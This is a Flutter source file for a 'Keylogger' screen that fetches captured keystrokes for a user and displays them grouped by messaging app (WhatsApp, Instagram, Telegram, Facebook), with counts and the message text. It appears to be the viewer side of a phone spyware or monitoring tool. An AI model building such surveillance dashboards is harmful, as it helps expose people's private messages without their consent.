import 'package:flutter/material.dart';
import '../../apis/get.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'package:collection/collection.dart';

class KeyloggerScreen extends StatefulWidget {
  final String username;

  const KeyloggerScreen({Key? key, required this.username}) : super(key: key);

  @override
  _KeyloggerScreenState createState() => _KeyloggerScreenState();
}

class _KeyloggerScreenState extends State<KeyloggerScreen> {
  late Future<List<Map<String, dynamic>>> _futureData;
  String selectedApp = '';

  @override
  void initState() {
    super.initState();
    _futureData = _loadKeyloggerData();
  }

  Future<List<Map<String, dynamic>>> _loadKeyloggerData() async {
    final rawData = await fetchModuleData(
      module: 'keylogger',
      userId: widget.username,
    );

    if (rawData == null || rawData is! List) return [];

    return rawData.expand<Map<String, dynamic>>((entry) {
      return (entry['data'] as List).map(
        (e) => {
          'app': e['app'],
          'messages': e['messages'],
          'fetchedTime': e['fetched time'],
        },
      );
    }).toList();
  }

  void refresh() {
    setState(() {
      _futureData = _loadKeyloggerData();
    });
  }

  Map<String, List<String>> groupMessagesByApp(List<Map<String, dynamic>> data) {
    final grouped = <String, List<String>>{};
    for (var item in data) {
      final app = item['app'] as String;
      final messages = List<String>.from(item['messages']);
      grouped.putIfAbsent(app, () => []).addAll(messages);
    }
    return grouped;
  }

  Icon _getAppIcon(String app) {
    final isDark = Theme.of(context).brightness == Brightness.dark;
    return Icon(
      switch (app.toLowerCase()) {
        'whatsapp' => FontAwesomeIcons.whatsapp,
        'instagram' => FontAwesomeIcons.instagram,
        'telegram' => FontAwesomeIcons.telegram,
        'facebook' => FontAwesomeIcons.facebook,
        _ => Icons.smartphone,
      },
      color: isDark ? Colors.white : Colors.black,
    );
  }

  Widget _summaryCard({
    required String title,
    required String subtitle,
    required IconData icon,
    required int value,
    required bool isPositive,
    required bool isDark,
  }) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        color: const Color(0xFFF0F0F0),
        boxShadow: [
          if (!isDark) BoxShadow(color: Colors.black26, blurRadius: 6),
        ],
      ),
      child: Row(
        children: [
          Icon(icon, size: 36, color: Colors.black87),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title,
                    style: const TextStyle(
                      fontFamily: 'NexaBold',
                      color: Colors.black87,
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                    )),
                const SizedBox(height: 4),
                Text(
                  subtitle,
                  style: const TextStyle(
                    fontFamily: 'NexaBold',
                    color: Colors.black54,
                  ),
                ),
              ],
            ),
          ),
          Icon(
            isPositive ? Icons.arrow_upward : Icons.arrow_downward,
            color: isPositive ? Colors.green : Colors.red,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return Scaffold(
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        automaticallyImplyLeading: false,
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            color: const Color.fromARGB(255, 255, 255, 255),
            borderRadius: BorderRadius.circular(20),
            boxShadow: [
              if (!isDark)
                const BoxShadow(
                  color: Colors.black12,
                  blurRadius: 4,
                  offset: Offset(0, 2),
                ),
            ],
          ),
          child: const Text(
            'Keylogger',
            style: TextStyle(
              fontFamily: 'NexaBold',
              fontSize: 18,
              fontWeight: FontWeight.bold,
              color: Colors.black87,
            ),
          ),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            onPressed: refresh,
            color: Colors.white,
          ),
        ],
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: isDark
              ? const LinearGradient(colors: [Colors.black, Colors.black])
              : const LinearGradient(
                  begin: Alignment.bottomLeft,
                  end: Alignment.topRight,
                  colors: [
                    Color(0xFF0090FF),
                    Color(0xFF15D6A6),
                    Color(0xFF123A5B),
                  ],
                ),
        ),
        child: FutureBuilder<List<Map<String, dynamic>>>(
          future: _futureData,
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return const Center(
                child: CircularProgressIndicator(color: Colors.white),
              );
            } else if (snapshot.hasError ||
                snapshot.data == null ||
                snapshot.data!.isEmpty) {
              return const Center(
                child: Text(
                  "No keylogger data available",
                  style: TextStyle(
                    fontFamily: 'NexaBold',
                    color: Colors.white,
                  ),
                ),
              );
            }

            final groupedData = groupMessagesByApp(snapshot.data!);
            final todayKeystrokes = groupedData.values
                .fold<int>(0, (sum, list) => sum + list.length);
            final highestApp = groupedData.entries.reduce(
              (a, b) => a.value.length > b.value.length ? a : b,
            );

            return SingleChildScrollView(
              padding: const EdgeInsets.fromLTRB(16, kToolbarHeight + 18, 16, 18),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _summaryCard(
                    title: "No. of Keystrokes Today",
                    subtitle: "$todayKeystrokes keystrokes",
                    icon: Icons.keyboard_alt,
                    value: todayKeystrokes,
                    isPositive: todayKeystrokes > 100,
                    isDark: isDark,
                  ).animate().fadeIn().slideY(begin: 0.2),
                  _summaryCard(
                    title: "Highest Keystroke App",
                    subtitle:
                        "${highestApp.key} - ${highestApp.value.length} keys",
                    icon: Icons.bar_chart,
                    value: highestApp.value.length,
                    isPositive: highestApp.value.length > 100,
                    isDark: isDark,
                  ).animate().fadeIn().slideY(begin: 0.2, delay: 200.ms),
                  const SizedBox(height: 16),
                  Container(
                    padding: const EdgeInsets.all(12),
                    margin: const EdgeInsets.symmetric(vertical: 5),
                    decoration: BoxDecoration(
                      color: const Color(0xFFF0F0F0),
                      borderRadius: BorderRadius.circular(16),
                      boxShadow: [
                        if (!isDark)
                          const BoxShadow(color: Colors.black26, blurRadius: 5)
                      ],
                    ),
                    child: Row(
                      children: [
                        const Text(
                          "Select App:",
                          style: TextStyle(
                            fontFamily: 'NexaBold',
                            color: Colors.black87,
                          ),
                        ),
                        const SizedBox(width: 12),
                        DropdownButton<String>(
                          dropdownColor: const Color(0xFFF0F0F0),
                          style: const TextStyle(
                            fontFamily: 'NexaBold',
                            color: Colors.black87,
                          ),
                          value: selectedApp.isEmpty ? null : selectedApp,
                          hint: const Text(
                            "All Apps",
                            style: TextStyle(
                              fontFamily: 'NexaBold',
                              color: Colors.black54,
                            ),
                          ),
                          items: groupedData.keys
                              .map((app) => DropdownMenuItem<String>(
                                    value: app,
                                    child: Text(
                                      app,
                                      style: const TextStyle(
                                        fontFamily: 'NexaBold',
                                      ),
                                    ),
                                  ))
                              .toList(),
                          onChanged: (value) {
                            setState(() {
                              selectedApp = value ?? '';
                            });
                          },
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 8),
                  ...groupedData.entries.map((entry) {
                    if (selectedApp.isNotEmpty && selectedApp != entry.key) {
                      return const SizedBox.shrink();
                    }

                    return Container(
                      padding: const EdgeInsets.all(8),
                      margin: const EdgeInsets.only(bottom: 12),
                      decoration: BoxDecoration(
                        color: const Color(0xFFF0F0F0),
                        borderRadius: BorderRadius.circular(16),
                        boxShadow: [
                          if (!isDark)
                            const BoxShadow(color: Colors.black26, blurRadius: 4)
                        ],
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              _getAppIcon(entry.key),
                              const SizedBox(width: 10),
                              Text(
                                entry.key,
                                style: const TextStyle(
                                  fontFamily: 'NexaBold',
                                  color: Colors.black87,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 6),
                          ...entry.value.mapIndexed((i, msg) {
                            return ListTile(
                              contentPadding:
                                  const EdgeInsets.symmetric(horizontal: 4),
                              leading: const Icon(Icons.keyboard,
                                  color: Colors.black87),
                              title: Text(
                                msg,
                                style: const TextStyle(
                                  fontFamily: 'NexaBold',
                                  color: Colors.black87,
                                ),
                              ),
                            )
                                .animate()
                                .fadeIn(duration: 300.ms, delay: (i * 30).ms)
                                .slideX(begin: 0.05);
                          }),
                        ],
                      ),
                    );
                  }).toList(),
                ],
              ),
            );
          },
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: refresh,
        backgroundColor: isDark ? Colors.grey[850] : Colors.white,
        child:
            Icon(Icons.refresh, color: isDark ? Colors.white : Colors.black),
      ),
    );
  }
}
